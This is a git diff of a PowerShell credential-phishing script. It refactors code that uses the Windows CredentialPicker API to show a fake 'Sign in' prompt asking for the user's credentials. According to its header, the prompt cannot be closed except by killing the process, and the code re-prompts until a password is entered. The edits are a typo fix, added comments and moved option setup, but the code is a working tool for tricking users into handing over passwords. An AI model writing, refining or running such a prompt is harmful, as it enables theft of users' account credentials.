@@ -8,7 +8,7 @@ The box cannot be closed (only by killing the process) and it keeps checking the
 '''
 ###########################################################################################################
 
-# Prerequisities
+# Prerequisites
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
 $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
 [Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
@@ -17,9 +17,21 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 [Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 
 $CurrentDomain_Name = $env:USERDOMAIN
+
+# For our While loop
 $status = $true
 
+$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
+    
+# There are 6 different authentication protocols supported. Can be seen here: https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
+$options.AuthenticationProtocol = 0
+$options.Caption = "Sign in"
+$options.Message = "Enter your credentials"
 
+
+
+
+# CredentialPicker is using Async so we will need to use Await
 function Await($WinRtTask, $ResultType) {
     $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
     $netTask = $asTask.Invoke($null, @($WinRtTask))
@@ -29,13 +41,10 @@ function Await($WinRtTask, $ResultType) {
 
 
 function Credentials(){
-    $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
-    $options.AuthenticationProtocol = 0
-    $options.Caption = "Sign in"
-    $options.Message = "Enter your credentials"
     $options.TargetName = "1"
     while ($status){
         
+        # Where the magic happens
         $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
         if (!$creds.CredentialPassword -or $creds.CredentialPassword -eq $null){
             Credentials
